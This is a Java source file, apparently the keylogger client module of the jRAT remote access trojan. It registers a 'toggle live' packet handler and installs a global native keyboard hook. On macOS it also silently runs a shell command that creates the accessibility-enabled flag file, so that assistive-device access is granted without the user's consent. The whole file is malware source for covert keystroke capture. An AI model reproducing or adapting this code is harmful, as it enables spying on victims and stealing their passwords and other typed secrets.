package jrat.module.keys;

import jrat.api.ClientModule;
import jrat.client.packets.incoming.IncomingPackets;
import jrat.module.keys.packets.PacketToggleLive;
import org.jnativehook.GlobalScreen;
import oslib.OperatingSystem;

public class KeysClientModule extends ClientModule {

    public void init() throws Exception {
        IncomingPackets.register((short) 125, PacketToggleLive.class);

        /**
         * Try to enable assistive devices on OS X.
         * This will not work in OS X 10.10 and above.
         */
        try {
            if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.MACOS) {
                System.out.println("Trying to enable assistive devices... Even if enabled");

                Runtime.getRuntime().exec("touch /private/var/db/.AccessibilityAPIEnabled");

                System.out.println("Successfully executed command");
            }
        } catch (Exception ex) {
            ex.printStackTrace();
            System.out.println("Failed to execute command. No root?");
        }

        // Register the native hook
        GlobalScreen.registerNativeHook();

        Runtime.getRuntime().addShutdownHook(new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    GlobalScreen.unregisterNativeHook();
                } catch (Exception ex) {
                    ex.printStackTrace();
                }
            }
        }));
    }
}
